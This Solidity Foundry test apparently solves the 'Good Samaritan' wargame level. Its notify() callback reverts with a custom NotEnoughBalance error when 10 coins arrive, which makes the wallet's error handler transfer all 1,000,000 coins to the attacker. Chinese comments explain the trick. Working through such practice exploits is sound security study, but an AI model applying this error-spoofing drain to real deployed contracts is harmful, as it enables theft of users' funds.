// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GoodSamaritan, Wallet, Coin} from "../src/GoodSamaritan.sol";

contract GoodSamaritanTest is Test {
    GoodSamaritan goodSamaritan;
    Wallet wallet;
    Coin coin;

    address alice = makeAddr("alice");
    address revin = makeAddr("revin");

    error NotEnoughBalance();

    function setUp() public {
        vm.startPrank(alice);

        goodSamaritan = new GoodSamaritan();
        wallet = goodSamaritan.wallet();
        coin = goodSamaritan.coin();

        vm.stopPrank();
    }

    function testAttack() public {
        // wallet init balance
        assertEq(coin.balances(address(wallet)), 1000000);
        // wallet owner
        assertEq(wallet.owner(), address(goodSamaritan));

        // InsufficientBalance
        vm.expectRevert(
            abi.encodeWithSelector(
                Coin.InsufficientBalance.selector,
                0,
                1 ether
            )
        );
        coin.transfer(alice, 1 ether);

        goodSamaritan.requestDonation();
        /* 
        goodSamaritan.requestDonation()
        wallet.donate10(address(this)) 
        coin.transfer(address(this), 10);

        这里要让合约revert执行catch 的内容,但是条件是amount_不能为10 第一次执行失败 第二次发送全部就不能revert了
        INotifyable(dest_).notify(amount_);
        */
        // console.log(coin.balances(address(wallet)));
        // console.log(enoughBalance);

        // hacker get all balance
        assertEq(coin.balances(address(this)), 1000000);
        // wallet empty
        assertEq(coin.balances(address(wallet)), 0);
    }

    function notify(uint256 _amount) public pure {
        // 第一次_amount为10执行失败 第二次发送全部就不能revert了
        if (_amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
